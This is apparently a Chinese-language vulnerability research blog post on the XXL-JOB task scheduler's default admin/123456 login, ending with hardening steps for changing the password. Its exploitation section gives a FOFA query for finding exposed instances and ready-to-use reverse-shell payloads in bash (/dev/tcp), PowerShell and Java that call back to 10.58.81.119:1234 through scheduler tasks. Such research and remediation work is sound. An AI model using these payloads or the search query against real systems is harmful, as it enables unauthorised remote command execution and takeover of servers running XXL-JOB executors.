#  漏洞研究(6)：XXL-JOB调度中心默认口令漏洞   
原创 罗锦海  OneMoreThink   2025-05-12 17:17  
  
## 1. 组件介绍  
  
XXL-JOB是一个分布式**任务调度**  
平台，分为调度中心和执行器两部分。  
  
在调度中心添加执行器后，调度中心可以对执行器进行命令执行，属于集权系统，可以帮助攻击者批量获取服务器权限。  
  
同时，通过调度中心横向到执行器，往往可以帮助攻击者实现跨网横移，这在网络策略严格的环境中具有较大价值。  
## 2. 原理与危害  
  
XXL-JOB的默认帐号密码是admin/123456  
，属于管理员权限。  
  
如果默认口令未修改，攻击者就能登录调度中心，与执行器进行调度通信，对执行器所在的服务器进行任意命令执行，从而获得执行器所在服务器的权限。  
## 3. 影响版本  
  
所有版本的默认口令都是admin/123456  
，因此所有版本的XXL-JOB  
都受到影响。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHgOB4mjqneK5afn0jjfQQGqxp524mKeha36bRAlwSAcOxgichueWgUJA/640?from=appmsg "")  
## 4. 利用方式  
  
FOFA：  
```
app="XXL-JOB" || title="任务调度中心"
```  
### 4.1 Shell脚本  
  
适用于执行器所在服务器的操作系统是具有Shell环境的Linux。  
#### 4.1.1 创建任务  
```
1. 任务管理2. 新增	1. 执行器：【选择需要攻击的执行器】	2. 运行模式：GLUE(Shell)3. 保存
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHYUMPGvqDeYFfDKic2j143zeRgp5wAACiciaKYGlyLia6M1NU6xn6rPsxTQ/640?from=appmsg "")  
#### 4.1.2 编辑任务  
```
1. 任务管理2. 【选择对应执行器】3. 【选择对应任务】4. 操作5. GLUE(Shell IDE)6. 【编写EXP代码】	1. bash -i >& /dev/tcp/10.58.81.119/1234 0>&17. 保存8. 源码备注9. 保存10. 关闭
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHsAuBwiaePT9IegvAJmr1CLiahEIq5ia9BcAjAVKzd8z40plLnY4VGiaCDQ/640?from=appmsg "")  
#### 4.1.3 执行任务  
```
1. 任务管理2. 【选择对应执行器】3. 【选择对应任务】4. 操作5. 执行一次6. 保存
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHUiaiaZzWO2uKr38LESCD13UrRQ47ofMt8qLzMYoNKIAtoVibiccaaLw3lw/640?from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHapxyRtBt294GfJ0DkYIbpHlTdMQOr3pVpHYiaP5aPKLZ4QnVcc8lQnw/640?from=appmsg "")  
#### 4.1.4 查看日志  
```
1. 任务管理2. 【选择对应执行器】3. 【选择对应任务】4. 操作5. 查询日志6. 【选择对应日志】7. 操作8. 执行日志
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHxZaPlyhBgWqptibC2UXSQJVP78Z6vH0Z89VMrdftLTwardOANm1Ndyg/640?from=appmsg "")  
### 4.2 PowerShell脚本  
  
适用于执行器所在服务器的操作系统是具有PowerShell环境的Windows。  
#### 4.2.1 创建任务  
```
运行模式：GLUE(PowerShell)
```  
#### 4.2.2 编辑任务  
```
$LHOST = "10.58.81.119"; $LPORT = 1234; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CH2CfNACN4VxmBnICcRmGeMCWhgYxEDzLVUWdatgicewrM7ordSKxwbsQ/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHHSo3KfXdWFdtOaNM99v7B7aQ9JibM2rWQkDb4hIz2icSQyqB8bHXM8pA/640?from=appmsg "")  
### 4.3 Java代码  
  
适用于所有情况，因为能运行XXL-JOB，执行器所在服务器肯定有Java环境。  
#### 4.3.1 创建任务  
```
运行模式：GLUE(Java)
```  
#### 4.3.2 编辑任务  
```
import java.io.IOException;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;publicclassExploit{publicExploit()throws Exception {        String host="10.58.81.119";int port=1234;        String cmd="/bin/bash";        Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();        Socket s=new Socket(host,port);        InputStream pi=p.getInputStream(),            pe=p.getErrorStream(),            si=s.getInputStream();        OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()) {while(pi.available()>0)                so.write(pi.read());while(pe.available()>0)                so.write(pe.read());while(si.available()>0)                po.write(si.read());            so.flush();            po.flush();            Thread.sleep(50);try {                p.exitValue();break;            }catch (Exception e){            }        };        p.destroy();        s.close();    }}
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHC5bwEWtTNickPkJoAwGPB891pezo56kyH3gOQ7JQU7vRDGoRuKcYReQ/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHsAfmctmZxB0viawbkXjQM0iazX6ff9eVtPmoCoDgMTM1RhRF7ASYGdgw/640?from=appmsg "")  
## 5. 加固措施  
### 5.1 修改默认口令  
  
点击右上角的欢迎 admin  
，选择修改密码，修改后会退出登录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHD3KsTeKEKUCmiaVnn9UqY7KKLnm6YNxKz5oU7fyBf3fIUIAchjiaGZEQ/640?from=appmsg "")  
  
请注意：登录密码不应超过18位，因为前端登录时会对密码进行截取。XXL-JOB >= 2.1.1  
时前端无法改成超过18位的密码，但XXL-JOB < 2.1.1  
时可以，导致修改密码后无法登录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHKu5lCSpsqnApmkWz57WGR5etRbqiaOBS4iaArOZdIP52z8ZPUpeAv6iag/640?from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHm004hNXIzvogj9fkvkYU8NVM9Yzduu1PWZDwIq2CrxUpjI5bpqqT8g/640?from=appmsg "")  
  
此时使用默认口令登录，提示帐号或密码错误，说明漏洞修复成功。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHYsAKia7hzZWyQ2IcY3tdDBaCaWicK7RglfIwdz8LQLA8LQgFPSFLkg6A/640?from=appmsg "")  
### 5.2 代码中修改默认口令  
  
使用32位小写md5值，替换掉默认口令。  
  
请注意：登录密码不应超过18位，因为前端登录时会对密码进行截取，超过将导致无法登录。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHtJAg136ZhVPJJE0F3kRiaKN0QcbzibxjK5JOcmWibEXGSzm2CRHcreibgA/640?from=appmsg "")  
```
vim doc/db/tables_xxl_job.sql
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CH6az0bHdOfCjHhM9UiaMPrUce7pX3NmeF6OmXcAczgamj4hz4HBg5ZCg/640?from=appmsg "")  
  
这样在部署XXL-JOB时，就不会使用默认口令初始化数据库，虽然存在口令复用问题，但也算部分实现了**安全左移**  
。  
```
### 初始化数据库mysql -u root -p    source /usr/local/xxl-job-2.2.0/doc/db/tables_xxl_job.sqlexit
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/hJB695EcV90iaQUplmAXLp5oibtqVPU8CHetJjt8ibKDfibMKxWQia0nWe1btXag0XzcnR9YrK9pjo2mbcSMFD65UBA/640?from=appmsg "")  
  
新部署好XXL-JOB后，使用默认口令登录，提示帐号或密码错误，说明漏洞不存在。  
  
